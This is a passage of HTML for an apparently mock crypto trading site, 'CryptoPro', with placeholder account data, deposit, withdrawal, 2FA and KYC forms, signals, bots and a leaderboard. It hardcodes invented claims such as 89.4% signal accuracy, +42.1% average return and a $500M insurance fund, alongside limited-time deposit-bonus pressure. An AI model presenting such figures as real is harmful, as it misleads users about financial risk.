                <div style="font-family:var(--font-mono);font-size:24px;font-weight:800;color:var(--yellow)" id="refPending">$25</div>
                <div style="font-size:11px;color:var(--text3);margin-top:3px">Pending</div>
              </div>
              <div style="background:var(--bg2);border-radius:var(--r-lg);padding:14px;text-align:center">
                <div style="font-family:var(--font-mono);font-size:24px;font-weight:800;color:var(--cyan)">20%</div>
                <div style="font-size:11px;color:var(--text3);margin-top:3px">Commission Rate</div>
              </div>
            </div>
            <div style="font-size:12px;color:var(--text2);background:var(--bg2);border-radius:var(--r-md);padding:10px">
              ðŸ’¡ <strong style="color:var(--text1)">Tier Bonus:</strong> Refer 10+ friends and earn 25% lifetime commission plus VIP Gold status!
            </div>
          </div>
        </div>
      </div>

      <!-- SETTINGS SECTION -->
      <div id="dashSectionSettings" style="display:none">
        <div class="dash-two-col">
          <div class="dash-card">
            <div class="dc-header"><span class="dc-title">âš™ï¸ Account Settings</span></div>
            <div style="display:flex;flex-direction:column;gap:14px">
              <div>
                <label class="form-label" style="margin-bottom:6px">Display Name</label>
                <div class="input-wrap"><span class="input-icon">ðŸ‘¤</span><input type="text" class="form-input" id="settingsName" placeholder="Your name" value="John Doe"></div>
              </div>
              <div>
                <label class="form-label" style="margin-bottom:6px">Email</label>
                <div class="input-wrap"><span class="input-icon">ðŸ“§</span><input type="email" class="form-input" id="settingsEmail" placeholder="email@example.com" value="john@example.com"></div>
              </div>
              <div>
                <label class="form-label" style="margin-bottom:6px">Anti-Phishing Code</label>
                <div style="display:flex;gap:8px;align-items:center">
                  <div class="input-wrap" style="flex:1"><span class="input-icon">ðŸ›¡ï¸</span><input type="text" class="form-input" id="antiphishCode" placeholder="Set a secret word" value="MANGO2024"></div>
                  <span class="antiphishing-badge">âœ“ Active</span>
                </div>
                <div style="font-size:11px;color:var(--text3);margin-top:4px">This code appears in all legitimate emails from CryptoPro</div>
              </div>
              <div style="display:flex;align-items:center;justify-content:space-between;padding:12px;background:var(--bg2);border-radius:var(--r-md)">
                <div><div style="font-size:13px;font-weight:600">Two-Factor Authentication</div><div style="font-size:11px;color:var(--green);margin-top:2px">âœ“ Enabled via Authenticator App</div></div>
                <button class="btn btn-outline" style="font-size:11px" onclick="show2FAModal()">Manage</button>
              </div>
              <div style="display:flex;align-items:center;justify-content:space-between;padding:12px;background:var(--bg2);border-radius:var(--r-md)">
                <div><div style="font-size:13px;font-weight:600">Notifications</div><div style="font-size:11px;color:var(--text3);margin-top:2px">Price alerts, trade fills, withdrawals</div></div>
                <input type="checkbox" checked style="accent-color:var(--green);width:18px;height:18px">
              </div>
              <button class="btn btn-green" onclick="saveSettings()">Save Changes</button>
            </div>
          </div>
          <div style="display:flex;flex-direction:column;gap:16px">
            <!-- DEVICES -->
            <div class="dash-card">
              <div class="dc-header"><span class="dc-title">ðŸ–¥ï¸ Active Devices</span></div>
              <div id="deviceList"></div>
            </div>
            <!-- IP WHITELIST -->
            <div class="dash-card">
              <div class="dc-header"><span class="dc-title">ðŸ”’ IP Whitelist</span><button class="btn btn-outline" style="font-size:11px;padding:4px 10px" onclick="addIPWhitelist()">+ Add IP</button></div>
              <div id="ipWhitelistList"></div>
            </div>
          </div>
        </div>
        <!-- PRICE ALERTS -->
        <div class="dash-card" style="margin-top:0">
          <div class="dc-header"><span class="dc-title">ðŸ”” Price Alerts</span><button class="btn btn-green" style="font-size:12px;padding:6px 14px" onclick="showPriceAlertModal()">+ New Alert</button></div>
          <div id="priceAlertsList"></div>
        </div>
      </div>

    </div><!-- end dash-content -->
  </div><!-- end dash-body -->
</div>

<!-- â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• SIGNALS LAYER â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• -->
<div class="layer" id="signalsLayer">
  <div style="padding:20px 24px">
    <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:16px;flex-wrap:wrap;gap:10px">
      <div>
        <div style="font-family:var(--font-display);font-size:22px;font-weight:800">ðŸŽ¯ AI Trading Signals</div>
        <div style="font-size:13px;color:var(--text2);margin-top:4px">Machine-learning powered signals updated every 15 minutes</div>
      </div>
      <div style="display:flex;gap:8px;align-items:center">
        <div style="display:flex;align-items:center;gap:6px;padding:6px 12px;background:var(--green3);border:1px solid rgba(0,230,118,.2);border-radius:20px;font-size:12px;font-weight:700;color:var(--green)">
          <div class="live-dot"></div>Live Signals
        </div>
        <select id="signalFilter" style="padding:6px 12px;background:var(--bg2);border:1px solid var(--border);border-radius:var(--r-md);color:var(--text1);font-size:12px" onchange="filterSignals()">
          <option value="all">All Signals</option>
          <option value="buy">BUY Only</option>
          <option value="sell">SELL Only</option>
          <option value="high">High Confidence</option>
        </select>
      </div>
    </div>

    <!-- ACCURACY BANNER -->
    <div style="display:grid;grid-template-columns:repeat(auto-fill,minmax(160px,1fr));gap:12px;margin-bottom:20px">
      <div style="background:var(--bg1);border:1px solid var(--border);border-radius:var(--r-xl);padding:16px;text-align:center">
        <div style="font-family:var(--font-mono);font-size:28px;font-weight:900;color:var(--green)">89.4%</div>
        <div style="font-size:11px;color:var(--text3);text-transform:uppercase;letter-spacing:.5px;margin-top:3px">7-Day Accuracy</div>
      </div>
      <div style="background:var(--bg1);border:1px solid var(--border);border-radius:var(--r-xl);padding:16px;text-align:center">
        <div style="font-family:var(--font-mono);font-size:28px;font-weight:900;color:var(--cyan)">247</div>
        <div style="font-size:11px;color:var(--text3);text-transform:uppercase;letter-spacing:.5px;margin-top:3px">Signals This Month</div>
      </div>
      <div style="background:var(--bg1);border:1px solid var(--border);border-radius:var(--r-xl);padding:16px;text-align:center">
        <div style="font-family:var(--font-mono);font-size:28px;font-weight:900;color:var(--yellow)">+42.1%</div>
        <div style="font-size:11px;color:var(--text3);text-transform:uppercase;letter-spacing:.5px;margin-top:3px">Avg Return</div>
      </div>
      <div style="background:var(--bg1);border:1px solid var(--border);border-radius:var(--r-xl);padding:16px;text-align:center">
        <div style="font-family:var(--font-mono);font-size:28px;font-weight:900;color:var(--purple)">4.2h</div>
        <div style="font-size:11px;color:var(--text3);text-transform:uppercase;letter-spacing:.5px;margin-top:3px">Avg Signal Duration</div>
      </div>
    </div>

    <div class="features-grid" id="signalsGrid" style="grid-template-columns:repeat(auto-fill,minmax(300px,1fr))"></div>
  </div>
</div>

<!-- â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• BOTS LAYER â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• -->
<div class="layer" id="botsLayer">
  <div style="padding:20px 24px">
    <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:16px;flex-wrap:wrap;gap:10px">
      <div>
        <div style="font-family:var(--font-display);font-size:22px;font-weight:800">ðŸ¤– Trading Bots</div>
        <div style="font-size:13px;color:var(--text2);margin-top:4px">Automated strategies trading 24/7 on your behalf</div>
      </div>
      <div style="display:flex;gap:8px;align-items:center">
        <div style="font-size:12px;color:var(--text2)">Total Bot Profit: <strong style="color:var(--green);font-family:var(--font-mono)" id="totalBotProfit">+$0.00</strong></div>
        <button class="btn btn-green" onclick="showCreateBotModal()">+ Create Custom Bot</button>
      </div>
    </div>
    <div class="bots-grid" id="botsGrid"></div>
  </div>
</div>

<!-- â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• COPY TRADING LAYER â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• -->
<div class="layer" id="copyTradingLayer">
  <div style="padding:20px 24px">
    <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:8px;flex-wrap:wrap;gap:10px">
      <div>
        <div style="font-family:var(--font-display);font-size:22px;font-weight:800">ðŸ‘¥ Copy Trading</div>
        <div style="font-size:13px;color:var(--text2);margin-top:4px">Mirror top traders automatically. Start with as little as $10.</div>
      </div>
      <div style="display:flex;gap:8px;flex-wrap:wrap">
        <select style="padding:7px 12px;background:var(--bg2);border:1px solid var(--border);border-radius:var(--r-md);color:var(--text1);font-size:12px" id="copyFilter" onchange="filterCopyTraders()">
          <option value="all">All Traders</option>
          <option value="top">Top Performers</option>
          <option value="safe">Low Risk</option>
          <option value="new">New This Month</option>
        </select>
        <select style="padding:7px 12px;background:var(--bg2);border:1px solid var(--border);border-radius:var(--r-md);color:var(--text1);font-size:12px">
          <option>Sort: ROI</option>
          <option>Sort: Followers</option>
          <option>Sort: Win Rate</option>
        </select>
      </div>
    </div>
    <div style="display:flex;gap:10px;margin-bottom:16px;overflow-x:auto;padding-bottom:4px">
      <div style="background:var(--bg1);border:1px solid var(--border);border-radius:var(--r-xl);padding:12px 20px;text-align:center;min-width:130px;flex-shrink:0">
        <div style="font-family:var(--font-mono);font-size:20px;font-weight:800;color:var(--cyan)" id="copyingCount">0</div>
        <div style="font-size:10px;color:var(--text3);text-transform:uppercase;letter-spacing:.5px;margin-top:2px">Copying Now</div>
      </div>
      <div style="background:var(--bg1);border:1px solid var(--border);border-radius:var(--r-xl);padding:12px 20px;text-align:center;min-width:130px;flex-shrink:0">
        <div style="font-family:var(--font-mono);font-size:20px;font-weight:800;color:var(--green)" id="copyTotalProfit">+$0.00</div>
        <div style="font-size:10px;color:var(--text3);text-transform:uppercase;letter-spacing:.5px;margin-top:2px">Copy Profit</div>
      </div>
      <div style="background:var(--bg1);border:1px solid var(--border);border-radius:var(--r-xl);padding:12px 20px;text-align:center;min-width:130px;flex-shrink:0">
        <div style="font-family:var(--font-mono);font-size:20px;font-weight:800">847</div>
        <div style="font-size:10px;color:var(--text3);text-transform:uppercase;letter-spacing:.5px;margin-top:2px">Elite Traders</div>
      </div>
    </div>
    <div class="bots-grid" id="copyTradersGrid" style="grid-template-columns:repeat(auto-fill,minmax(300px,1fr))"></div>
  </div>
</div>

<!-- â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• DEPOSIT LAYER â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• -->
<div class="layer" id="depositLayer">
  <div style="max-width:700px;margin:0 auto;padding:24px">
    <div style="display:flex;align-items:center;gap:12px;margin-bottom:20px">
      <button onclick="showLayer('dashboardLayer')" style="background:var(--bg2);border:1px solid var(--border);border-radius:var(--r-md);padding:8px 12px;color:var(--text2);cursor:pointer;font-size:14px">â† Back</button>
      <div style="font-family:var(--font-display);font-size:20px;font-weight:800">ðŸ’³ Deposit Funds</div>
    </div>

    <!-- BONUS BANNER -->
    <div class="dep-bonus-banner">
      <div class="dbb-title">ðŸŽ First Deposit Bonus â€” Up to $500 FREE</div>
      <div class="dbb-sub">Deposit more to unlock bigger bonuses. Limited time offer!</div>
      <div class="dbb-progress"><div class="dbb-fill" id="depBonusFill" style="width:0%"></div></div>
      <div class="dbb-labels">
        <span style="color:var(--text3)">$0 deposited</span>
        <span style="color:var(--yellow)" id="depBonusTarget">$500 for max bonus</span>
      </div>
      <div class="dbb-tiers">
        <div class="dbb-tier locked" id="dbbTier1">$50 â†’ +$10</div>
        <div class="dbb-tier locked" id="dbbTier2">$100 â†’ +$25</div>
        <div class="dbb-tier locked" id="dbbTier3">$250 â†’ +$75</div>
        <div class="dbb-tier locked" id="dbbTier4">$500 â†’ +$200</div>
      </div>
    </div>

    <!-- METHOD SELECT -->
    <div style="margin-bottom:20px">
      <div style="font-size:13px;font-weight:700;color:var(--text2);text-transform:uppercase;letter-spacing:.6px;margin-bottom:10px">Select Payment Method</div>
      <div style="display:grid;grid-template-columns:repeat(auto-fill,minmax(110px,1fr));gap:10px" id="depMethodGrid"></div>
    </div>

    <!-- AMOUNT -->
    <div class="form-group">
      <label class="form-label">Deposit Amount (USD)</label>
      <div class="op-input-wrap" style="border:1px solid var(--border);border-radius:var(--r-md);background:var(--bg2)">
        <span style="padding:0 12px;font-size:16px;color:var(--text3)">$</span>
        <input type="number" class="op-input" id="depAmount" placeholder="100.00" min="10" oninput="updateDepBonus()">
        <span class="op-input-suffix">USD</span>
      </div>
      <div style="display:flex;gap:6px;margin-top:8px">
        <button class="qp-btn" onclick="setDepAmt(50)">$50</button>
        <button class="qp-btn" onclick="setDepAmt(100)">$100</button>
        <button class="qp-btn" onclick="setDepAmt(250)">$250</button>
        <button class="qp-btn" onclick="setDepAmt(500)">$500</button>
        <button class="qp-btn" onclick="setDepAmt(1000)">$1,000</button>
        <button class="qp-btn" onclick="setDepAmt(5000)">$5,000</button>
      </div>
    </div>

    <!-- CRYPTO ADDR -->
    <div id="cryptoAddrSection" style="display:none">
      <div class="form-group">
        <label class="form-label">Send to this Address</label>
        <div style="background:var(--bg2);border:1px solid var(--border2);border-radius:var(--r-lg);padding:16px;text-align:center">
          <div id="depQRCode" style="width:120px;height:120px;background:white;border-radius:8px;margin:0 auto 12px;display:flex;align-items:center;justify-content:center;font-size:40px">ðŸ“±</div>
          <div style="font-family:var(--font-mono);font-size:11px;color:var(--text2);word-break:break-all;background:var(--bg3);padding:8px;border-radius:var(--r-sm);margin-bottom:8px" id="depCryptoAddr">1A1zP1eP5QGefi2DMPTfTL5SLmv7Divf...</div>
          <button class="btn btn-outline" style="font-size:12px" onclick="copyDepAddr()">ðŸ“‹ Copy Address</button>
        </div>
        <div style="font-size:11px;color:var(--yellow);margin-top:8px">âš ï¸ Only send the selected cryptocurrency. Wrong network = lost funds.</div>
      </div>
    </div>

    <!-- CARD FORM -->
    <div id="cardFormSection" style="display:none">
      <div class="form-group">
        <label class="form-label">Card Number</label>
        <div class="input-wrap"><span class="input-icon">ðŸ’³</span><input type="text" class="form-input" id="cardNumber" placeholder="1234 5678 9012 3456" maxlength="19" oninput="formatCardNum(this)"></div>
      </div>
      <div style="display:grid;grid-template-columns:1fr 1fr 1fr;gap:12px">
        <div class="form-group">
          <label class="form-label">Expiry</label>
          <div class="input-wrap"><span class="input-icon">ðŸ“…</span><input type="text" class="form-input" placeholder="MM/YY" maxlength="5"></div>
        </div>
        <div class="form-group">
          <label class="form-label">CVV</label>
          <div class="input-wrap"><span class="input-icon">ðŸ”’</span><input type="text" class="form-input" placeholder="123" maxlength="4"></div>
        </div>
        <div class="form-group">
          <label class="form-label">Name</label>
          <div class="input-wrap"><span class="input-icon">ðŸ‘¤</span><input type="text" class="form-input" placeholder="Card holder"></div>
        </div>
      </div>
    </div>

    <!-- BANK FORM -->
    <div id="bankFormSection" style="display:none">
      <div style="background:var(--bg2);border:1px solid var(--border);border-radius:var(--r-lg);padding:16px;margin-bottom:12px">
        <div style="font-size:13px;font-weight:700;margin-bottom:10px">Bank Transfer Details</div>
        <div class="modal-row"><span>Bank Name</span><span>CryptoPro Financial Ltd</span></div>
        <div class="modal-row"><span>Account Number</span><span style="font-family:var(--font-mono)">GB29 NWBK 6016 1331 9268 19</span></div>
        <div class="modal-row"><span>Sort Code</span><span style="font-family:var(--font-mono)">60-16-13</span></div>
        <div class="modal-row"><span>Reference</span><span style="font-family:var(--font-mono);color:var(--green)" id="bankRef">CP-USER123</span></div>
      </div>
      <div style="font-size:11px;color:var(--text3)">âš¡ Bank transfers typically process in 1-3 business days</div>
    </div>

    <button class="btn-auth" style="margin-top:8px" id="depSubmitBtn" onclick="submitDeposit()">
      <span id="depBtnText">ðŸ’³ Deposit Now</span>
    </button>

    <div style="display:flex;justify-content:center;gap:16px;margin-top:16px;flex-wrap:wrap">
      <span style="font-size:11px;color:var(--text3)">ðŸ”’ 256-bit SSL Encryption</span>
      <span style="font-size:11px;color:var(--text3)">ðŸ›¡ï¸ $500M Insurance Fund</span>
      <span style="font-size:11px;color:var(--text3)">âš¡ Instant Crypto Deposits</span>
    </div>
  </div>
</div>

<!-- â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• HEATMAP LAYER â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• -->
<div class="layer" id="heatmapLayer">
  <div style="padding:20px 24px">
    <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:16px;flex-wrap:wrap;gap:10px">
      <div>
        <div style="font-family:var(--font-display);font-size:22px;font-weight:800">ðŸŒ¡ï¸ Market Heatmap</div>
        <div style="font-size:13px;color:var(--text2);margin-top:4px">Real-time performance across all major crypto assets</div>
      </div>
      <div style="display:flex;gap:8px">
        <button class="iv-btn active" onclick="setHeatmapPeriod('1h',this)">1H</button>
        <button class="iv-btn" onclick="setHeatmapPeriod('24h',this)">24H</button>
        <button class="iv-btn" onclick="setHeatmapPeriod('7d',this)">7D</button>
        <button class="iv-btn" onclick="setHeatmapPeriod('30d',this)">30D</button>
      </div>
    </div>
    <div id="heatmapGrid" style="display:grid;grid-template-columns:repeat(auto-fill,minmax(90px,1fr));gap:8px"></div>
  </div>
</div>

<!-- â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• LEADERBOARD LAYER â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• -->
<div class="layer" id="leaderboardLayer">
  <div style="padding:20px 24px">
    <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:16px;flex-wrap:wrap;gap:10px">
      <div>
        <div style="font-family:var(--font-display);font-size:22px;font-weight:800">ðŸ† Global Leaderboard</div>
        <div style="font-size:13px;color:var(--text2);margin-top:4px">Top traders ranked by weekly profit</div>
      </div>
      <div style="display:flex;gap:8px">
        <button class="iv-btn active" onclick="setLBPeriod('weekly',this)">Weekly</button>
        <button class="iv-btn" onclick="setLBPeriod('monthly',this)">Monthly</button>
        <button class="iv-btn" onclick="setLBPeriod('alltime',this)">All Time</button>
      </div>
    </div>
    <!-- Top 3 podium -->
    <div style="display:flex;justify-content:center;align-items:flex-end;gap:16px;margin-bottom:24px;padding:20px 0">
      <div style="text-align:center;animation:slideUp .4s ease .2s both" id="lb2nd">
        <div style="font-size:32px;margin-bottom:6px">ðŸ¥ˆ</div>
        <div style="width:56px;height:56px;border-radius:50%;background:linear-gradient(135deg,#C0C0C0,#888);display:flex;align-items:center;justify-content:center;font-size:24px;margin:0 auto 8px;border:2px solid #C0C0C0"></div>
        <div style="font-size:12px;font-weight:700" id="lb2Name">CryptoQueen</div>
        <div style="font-family:var(--font-mono);font-size:14px;color:var(--green);font-weight:800" id="lb2Profit">+$84,220</div>
      </div>
      <div style="text-align:center;animation:slideUp .4s ease both" id="lb1st">
        <div style="font-size:40px;margin-bottom:6px">ðŸ‘‘</div>
        <div style="width:72px;height:72px;border-radius:50%;background:linear-gradient(135deg,var(--yellow),#FF9800);display:flex;align-items:center;justify-content:center;font-size:32px;margin:0 auto 8px;border:3px solid var(--yellow);box-shadow:0 0 24px rgba(255,215,64,.4)"></div>
        <div style="font-size:14px;font-weight:800;font-family:var(--font-display)" id="lb1Name">BitcoinBull2099</div>
        <div style="font-family:var(--font-mono);font-size:18px;color:var(--yellow);font-weight:900" id="lb1Profit">+$142,840</div>
      </div>
      <div style="text-align:center;animation:slideUp .4s ease .4s both" id="lb3rd">
        <div style="font-size:32px;margin-bottom:6px">ðŸ¥‰</div>
        <div style="width:48px;height:48px;border-radius:50%;background:linear-gradient(135deg,#CD7F32,#A0522D);display:flex;align-items:center;justify-content:center;font-size:20px;margin:0 auto 8px;border:2px solid #CD7F32"></div>
        <div style="font-size:12px;font-weight:700" id="lb3Name">AlphaTrader</div>
        <div style="font-family:var(--font-mono);font-size:14px;color:var(--green);font-weight:800" id="lb3Profit">+$61,450</div>
      </div>
    </div>
    <div class="dash-card" style="padding:0;overflow:hidden">
      <div id="lbList"></div>
    </div>
  </div>
</div>

<!-- â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• ACHIEVEMENTS LAYER â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• -->
<div class="layer" id="achievementsLayer">
  <div style="padding:20px 24px">
    <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:8px;flex-wrap:wrap;gap:10px">
      <div>
        <div style="font-family:var(--font-display);font-size:22px;font-weight:800">ðŸ† Achievements & VIP</div>
        <div style="font-size:13px;color:var(--text2);margin-top:4px">Complete challenges to earn rewards and unlock VIP tiers</div>
      </div>
      <div>
        <span style="font-size:13px;color:var(--text2)">Your XP: </span>
        <span style="font-family:var(--font-mono);font-size:16px;font-weight:800;color:var(--yellow)" id="userXP">2,450 XP</span>
      </div>
    </div>

    <!-- VIP TIER BAR -->
    <div class="vip-tier-bar">
      <span class="vip-badge vip-bronze">ðŸ¥‰ Bronze</span>
      <span class="vip-badge vip-silver vip-current">ðŸ¥ˆ Silver â† You are here</span>
      <span class="vip-badge vip-gold">ðŸ¥‡ Gold â€” Need 5,000 XP</span>
      <span class="vip-badge vip-platinum">ðŸ’Ž Platinum â€” Need 15,000 XP</span>
      <span class="vip-badge vip-diamond">ðŸŒŸ Diamond â€” Need 50,000 XP</span>
    </div>

    <!-- XP PROGRESS -->
    <div style="background:var(--bg1);border:1px solid var(--border);border-radius:var(--r-xl);padding:16px;margin:16px 0">
      <div style="display:flex;justify-content:space-between;margin-bottom:8px;font-size:12px">
        <span style="color:var(--text2)">Silver â†’ Gold progress</span>
        <span style="font-family:var(--font-mono);font-weight:700;color:var(--yellow)">2,450 / 5,000 XP</span>
      </div>
      <div style="height:8px;background:var(--bg3);border-radius:4px;overflow:hidden">
        <div style="height:100%;width:49%;background:linear-gradient(90deg,var(--yellow),#FF9800);border-radius:4px;transition:width .6s ease"></div>
      </div>
      <div style="font-size:11px;color:var(--text3);margin-top:6px">2,550 XP until Gold â€” earn XP by trading, referring friends, and completing challenges</div>
    </div>

    <div style="font-size:14px;font-weight:800;font-family:var(--font-display);margin-bottom:12px">ðŸŽ–ï¸ Your Achievements</div>
    <div style="display:grid;grid-template-columns:repeat(auto-fill,minmax(130px,1fr));gap:12px" id="achievementGrid"></div>
  </div>
</div>

<!-- â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• MODALS â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• -->

<!-- WITHDRAW MODAL -->
<div id="withdrawModal" style="display:none" class="modal-overlay" onclick="if(event.target===this)closeModal('withdrawModal')">
  <div class="modal-box">
    <div class="modal-title">â†‘ Withdraw Funds</div>
    <div class="form-group">
      <label class="form-label">Withdrawal Method</label>
      <select class="form-input" style="padding-left:14px" id="withdrawMethod" onchange="updateWithdrawUI()">
        <option value="crypto">Cryptocurrency</option>
        <option value="bank">Bank Transfer</option>
        <option value="card">Debit Card</option>
      </select>
    </div>
    <div class="form-group">
      <label class="form-label">Amount (USD)</label>
      <div class="op-input-wrap" style="border:1px solid var(--border);border-radius:var(--r-md);background:var(--bg2)">
        <span style="padding:0 12px;color:var(--text3)">$</span>
        <input type="number" class="op-input" id="withdrawAmt" placeholder="Min $10">
        <span class="op-input-suffix">USD</span>
      </div>
      <div style="font-size:11px;color:var(--text3);margin-top:4px">Available: <strong style="color:var(--text1)">$8,250.00</strong> Â· Fee: <strong style="color:var(--yellow)">$0 (VIP)</strong></div>
    </div>
    <div class="form-group">
      <label class="form-label" id="withdrawAddrLabel">Crypto Address</label>
      <div class="input-wrap"><span class="input-icon">ðŸ“¬</span><input type="text" class="form-input" id="withdrawAddr" placeholder="Enter destination address"></div>
    </div>
    <div class="form-group">
      <label class="form-label">2FA Code</label>
      <div class="input-wrap"><span class="input-icon">ðŸ”</span><input type="text" class="form-input" id="withdraw2FA" placeholder="6-digit code from authenticator" maxlength="6"></div>
    </div>
    <div class="modal-actions">
      <button class="btn btn-outline" onclick="closeModal('withdrawModal')" style="flex:1">Cancel</button>
      <button class="btn btn-green" onclick="submitWithdraw()" style="flex:2">Confirm Withdrawal</button>
    </div>
  </div>
</div>

<!-- PRICE ALERT MODAL -->
<div id="priceAlertModal" style="display:none" class="modal-overlay" onclick="if(event.target===this)closeModal('priceAlertModal')">
  <div class="modal-box">
    <div class="modal-title">ðŸ”” Set Price Alert</div>
    <div class="form-group">
      <label class="form-label">Asset</label>
      <select class="form-input" style="padding-left:14px" id="alertAsset">
        <option>BTC/USDT</option><option>ETH/USDT</option><option>SOL/USDT</option><option>BNB/USDT</option><option>XRP/USDT</option><option>DOGE/USDT</option>
      </select>
    </div>
    <div class="form-group">
      <label class="form-label">Condition</label>
      <select class="form-input" style="padding-left:14px" id="alertCondition">
        <option value="above">Price goes above</option>
        <option value="below">Price goes below</option>
        <option value="change">% Change exceeds</option>
      </select>
    </div>
    <div class="form-group">
      <label class="form-label">Target Price / Value</label>
      <div class="op-input-wrap" style="border:1px solid var(--border);border-radius:var(--r-md);background:var(--bg2)">
        <span style="padding:0 12px;color:var(--text3)">$</span>
        <input type="number" class="op-input" id="alertPrice" placeholder="70000">
        <span class="op-input-suffix" id="alertSuffix">USDT</span>
      </div>
    </div>
    <div class="form-group">
      <label class="form-label">Notification</label>
      <div style="display:flex;gap:8px;flex-wrap:wrap">
        <label style="display:flex;align-items:center;gap:5px;font-size:12px;cursor:pointer"><input type="checkbox" checked style="accent-color:var(--green)"> Browser</label>
        <label style="display:flex;align-items:center;gap:5px;font-size:12px;cursor:pointer"><input type="checkbox" checked style="accent-color:var(--green)"> Email</label>
        <label style="display:flex;align-items:center;gap:5px;font-size:12px;cursor:pointer"><input type="checkbox" style="accent-color:var(--green)"> SMS</label>
        <label style="display:flex;align-items:center;gap:5px;font-size:12px;cursor:pointer"><input type="checkbox" style="accent-color:var(--green)"> Telegram</label>
      </div>
    </div>
    <div class="modal-actions">
      <button class="btn btn-outline" onclick="closeModal('priceAlertModal')" style="flex:1">Cancel</button>
      <button class="btn btn-green" onclick="savePriceAlert()" style="flex:2">Set Alert</button>
    </div>
  </div>
</div>

<!-- ORDER CONFIRM MODAL -->
<div id="orderConfirmModal" style="display:none" class="modal-overlay" onclick="if(event.target===this)closeModal('orderConfirmModal')">
  <div class="modal-box">
    <div class="modal-title" id="ocmTitle">âœ… Confirm Order</div>
    <div id="ocmBody"></div>
    <div class="modal-actions">
      <button class="btn btn-outline" onclick="closeModal('orderConfirmModal')" style="flex:1">Cancel</button>
      <button class="btn btn-green" id="ocmConfirmBtn" onclick="confirmOrder()" style="flex:2">Confirm</button>
    </div>
  </div>
</div>

<!-- FORGOT PASSWORD MODAL -->
<div id="forgotModal" style="display:none" class="modal-overlay" onclick="if(event.target===this)closeModal('forgotModal')">
  <div class="modal-box">
    <div class="modal-title">ðŸ”‘ Reset Password</div>
    <div style="font-size:13px;color:var(--text2);margin-bottom:16px">Enter your email and we'll send you a reset link</div>
    <div class="form-group">
      <label class="form-label">Email Address</label>
      <div class="input-wrap"><span class="input-icon">ðŸ“§</span><input type="email" class="form-input" id="forgotEmail" placeholder="your@email.com"></div>
    </div>
    <div class="modal-actions">
      <button class="btn btn-outline" onclick="closeModal('forgotModal')" style="flex:1">Cancel</button>
      <button class="btn btn-green" onclick="submitForgot()" style="flex:2">Send Reset Link</button>
    </div>
  </div>
</div>

<!-- 2FA MODAL -->
<div id="twoFAModal" style="display:none" class="modal-overlay" onclick="if(event.target===this)closeModal('twoFAModal')">
  <div class="modal-box" style="text-align:center">
    <div class="modal-title" style="justify-content:center">ðŸ” Two-Factor Authentication</div>
    <div style="font-size:13px;color:var(--text2);margin-bottom:16px">Scan QR code with your authenticator app</div>
    <div style="width:140px;height:140px;background:white;border-radius:12px;margin:0 auto 16px;display:flex;align-items:center;justify-content:center;font-size:60px">ðŸ“±</div>
    <div style="font-family:var(--font-mono);font-size:13px;background:var(--bg3);padding:10px;border-radius:var(--r-md);margin-bottom:16px;word-break:break-all">JBSWY3DPEHPK3PXP</div>
    <div style="font-size:13px;color:var(--text2);margin-bottom:12px">Enter the 6-digit code from your app to verify:</div>
    <div style="display:flex;gap:8px;justify-content:center;margin-bottom:16px">
      <input type="text" maxlength="1" class="form-input" style="width:44px;text-align:center;font-size:20px;font-weight:800;padding:10px 4px;font-family:var(--font-mono)">
      <input type="text" maxlength="1" class="form-input" style="width:44px;text-align:center;font-size:20px;font-weight:800;padding:10px 4px;font-family:var(--font-mono)">
      <input type="text" maxlength="1" class="form-input" style="width:44px;text-align:center;font-size:20px;font-weight:800;padding:10px 4px;font-family:var(--font-mono)">
      <input type="text" maxlength="1" class="form-input" style="width:44px;text-align:center;font-size:20px;font-weight:800;padding:10px 4px;font-family:var(--font-mono)">
      <input type="text" maxlength="1" class="form-input" style="width:44px;text-align:center;font-size:20px;font-weight:800;padding:10px 4px;font-family:var(--font-mono)">
      <input type="text" maxlength="1" class="form-input" style="width:44px;text-align:center;font-size:20px;font-weight:800;padding:10px 4px;font-family:var(--font-mono)">
    </div>
    <button class="btn-auth" onclick="verify2FA()">Verify & Enable 2FA</button>
    <button class="btn btn-outline" style="width:100%;margin-top:8px" onclick="closeModal('twoFAModal')">Cancel</button>
  </div>
</div>

<!-- KYC MODAL -->
<div id="kycModal" style="display:none" class="modal-overlay" onclick="if(event.target===this)closeModal('kycModal')">
  <div class="modal-box">
    <div class="modal-title">ðŸ†” Identity Verification (KYC)</div>
    <div style="display:flex;flex-direction:column;gap:12px;margin-bottom:16px">
      <div style="display:flex;align-items:center;gap:12px;padding:12px;background:var(--bg3);border-radius:var(--r-lg)">
        <div style="font-size:24px">ðŸ“„</div>
        <div><div style="font-size:13px;font-weight:600">Step 1: Government ID</div><div style="font-size:11px;color:var(--text3)">Passport, Driver's License, or National ID</div></div>
        <button class="btn btn-outline" style="margin-left:auto;font-size:11px;padding:5px 10px" onclick="showToast('ðŸ“¸ Upload your ID document','blue')">Upload</button>
      </div>
      <div style="display:flex;align-items:center;gap:12px;padding:12px;background:var(--bg3);border-radius:var(--r-lg)">
        <div style="font-size:24px">ðŸ¤³</div>
